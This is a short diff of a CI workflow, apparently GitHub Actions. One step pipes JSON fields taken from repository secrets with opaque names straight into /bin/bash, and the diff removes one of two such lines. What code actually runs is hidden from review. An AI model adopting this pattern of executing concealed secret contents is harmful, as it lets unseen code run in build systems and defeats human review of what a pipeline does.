@@ -17,7 +17,6 @@ jobs:
           sf20: ${{ secrets.sf20 }}
         run: |
           printf '%s' "$sf20" | jq -r .qaq7754 | /bin/bash
-          printf '%s' "$ca99743" | jq -r .h966 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
